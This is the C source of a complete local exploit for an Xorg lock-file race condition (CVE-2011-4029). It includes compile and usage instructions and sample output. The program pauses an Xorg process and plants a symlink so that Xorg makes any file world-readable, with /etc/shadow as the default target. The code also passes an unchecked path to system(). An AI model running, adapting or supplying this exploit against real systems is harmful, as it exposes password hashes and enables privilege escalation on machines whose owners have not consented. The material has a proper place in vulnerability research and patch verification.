/* xchmod.c -- Xorg file permission change vulnerability PoC
 
   Author:    vladz (http://vladz.devzero.fr)
   Date:      2011/10/27
   Software:  www.x.org
   Version:   Xorg 1.4 to 1.11.2 in all configurations.  Xorg 1.3 and
              earlier if built with the USE_CHMOD preprocessor identifier
   Tested on: Debian 6.0.2 up to date with X default configuration
              issued from the xserver-xorg-core package
              (version 2:1.7.7-13)
   CVE:       CVE-2011-4029
 
   This PoC sets the rights 444 (read for all) on any file specified as
   argument (default file is "/etc/shadow").  Another good use for an
   attacker would be to dump an entire partition in order to disclose its
   full content later (via a "mount -o loop").  Made for EDUCATIONAL
   PURPOSES ONLY!
 
   In some configurations, this exploit must be launched from a TTY
   (switch by typing Ctrl-Alt-Fn).
 
   Tested on Debian 6.0.2 up to date with X default configuration issued
   from the xserver-xorg-core package (version 2:1.7.7-13).
 
   Compile:  cc xchmod.c -o xchmod
   Usage:    ./xchmod [/path/to/file]    (default file is /etc/shadow)
 
   $ ls -l /etc/shadow
   -rw-r----- 1 root shadow 1072 Aug  7 07:10 /etc/shadow
   $ ./xchmod
   [+] Trying to stop a Xorg process right before chmod()
   [+] Process ID 4134 stopped (SIGSTOP sent)
   [+] Removing /tmp/.tX1-lock by launching another Xorg process
   [+] Creating evil symlink (/tmp/.tX1-lock -> /etc/shadow)
   [+] Process ID 4134 resumed (SIGCONT sent)
   [+] Attack succeeded, ls -l /etc/shadow:
   -r--r--r-- 1 root shadow 1072 Aug  7 07:10 /etc/shadow
 
   -----------------------------------------------------------------------
 
    "THE BEER-WARE LICENSE" (Revision 42):
    <vladz@devzero.fr> wrote this file. As long as you retain this notice
    you can do whatever you want with this stuff. If we meet some day, and
    you think this stuff is worth it, you can buy me a beer in return. -V.
*/
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <syscall.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
 
 
#define XORG_BIN     "/usr/bin/X"
#define DISPLAY      ":1"
 
 
char *get_tty_number(void) {
  char tty_name[128], *ptr;
 
  memset(tty_name, '\0', sizeof(tty_name));
  readlink("/proc/self/fd/0", tty_name, sizeof(tty_name));
 
  if ((ptr = strstr(tty_name, "tty")))
    return ptr + 3;
 
  return NULL;
}
 
int launch_xorg_instance(void) {
  int child_pid;
  char *opt[] = { XORG_BIN, DISPLAY, NULL };
 
  if ((child_pid = fork()) == 0) {
    close(1); close(2);
    execve(XORG_BIN, opt, NULL);
    _exit(0);
  }
 
  return child_pid;
}
 
void show_target_file(char *file) {
  char cmd[128];
 
  memset(cmd, '\0', sizeof(cmd));
  sprintf(cmd, "/bin/ls -l %s", file);
  system(cmd);
}
 
int main(int argc, char **argv) {
  pid_t proc;
  struct stat st;
  int n, ret, current_attempt = 800;
  char target_file[128], lockfiletmp[20], lockfile[20], *ttyno;
 
  if (argc < 2)
    strcpy(target_file, "/etc/shadow");
  else
    strcpy(target_file, argv[1]);
 
  sprintf(lockfile, "/tmp/.X%s-lock", DISPLAY+1);
  sprintf(lockfiletmp, "/tmp/.tX%s-lock", DISPLAY+1);
 
  /* we must ensure that Xorg is not already running on this display */
  if (stat(lockfile, &st) == 0) {
    printf("[-] %s exists, maybe Xorg is already running on this"
           " display?  Choose another display by editing the DISPLAY"
           " attributes.\n", lockfile);
    return 1;
  }
 
  /* this avoid execution to continue (and automatically switch to another
   * TTY).  Xorg quits with fatal error because the file that /tmp/.X?-lock
   * links does not exist.
   */
  symlink("/dontexist", lockfile);
 
  /* we have to force this mask to not comprise our later checks */
  umask(077);
 
  ttyno = get_tty_number();
 
  printf("[+] Trying to stop a Xorg process right before chmod()\n");
  while (--current_attempt) {
    proc = launch_xorg_instance();
 
    n = 0;
    while (n++ < 10000)
      if ((ret = syscall(SYS_stat, lockfiletmp, &st)) == 0)
    break;
 
    if (ret == 0) {
      syscall(SYS_kill, proc, SIGSTOP);
      printf("[+] Process ID %d stopped (SIGSTOP sent)\n", proc);
 
      stat(lockfiletmp, &st);
      if ((st.st_mode & 4) == 0)
    break;
 
      printf("[-] %s file has wrong rights (%o)\n"
         "[+] removing it by launching another Xorg process\n",
         lockfiletmp, st.st_mode);
      launch_xorg_instance();
      sleep(7);
    }
 
    kill(proc, SIGKILL);
  }
 
  if (current_attempt == 0) {
    printf("[-] Attack failed.\n");
 
    if (!ttyno)
      printf("Try with console ownership: switch to a TTY* by using "
         "Ctrl-Alt-F[1-6] and try again.\n");
 
    return 1;
  }
 
  printf("[+] Removing %s by launching another Xorg process\n",
         lockfiletmp);
  launch_xorg_instance();
  sleep(7);
 
  if (stat(lockfiletmp, &st) == 0) {
    printf("[-] %s lock file still here... :(\n", lockfiletmp);
    return 1;
  }
 
  printf("[+] Creating evil symlink (%s -> %s)\n", lockfiletmp,
         target_file);
  symlink(target_file, lockfiletmp);
 
  printf("[+] Process ID %d resumed (SIGCONT sent)\n", proc);
  kill(proc, SIGCONT);
 
  /* wait for chmod() to finish */
  usleep(300000);
 
  stat(target_file, &st);
  if (!(st.st_mode & 004)) {
    printf("[-] Attack failed, rights are %o.  Try again!\n", st.st_mode);
    return 1;
  }
 
  /* cleaning temporary link */
  unlink(lockfile);
 
  printf("[+] Attack succeeded, ls -l %s:\n", target_file);
  show_target_file(target_file);
 
  return 0;
}